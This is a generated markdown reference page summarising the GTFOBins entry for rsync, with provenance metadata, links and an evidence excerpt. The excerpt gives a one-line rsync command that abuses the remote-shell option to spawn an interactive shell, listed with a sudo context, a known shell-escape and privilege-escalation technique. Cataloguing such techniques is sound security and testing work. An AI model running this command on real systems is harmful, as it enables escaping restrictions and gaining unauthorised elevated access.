---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rsync

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rsync` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rsync` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for rsync covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/rsync.md)
- Source verification: [source record](../../sources/gtfobins/rsync.md)

## Aliases

- `rsync`

## Source Verification

[source record](../../sources/gtfobins/rsync.md)

## Evidence Excerpt

```text
_body: ''
_name: rsync
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rsync
functions:
shell:
- code: rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
contexts:
sudo: null
```
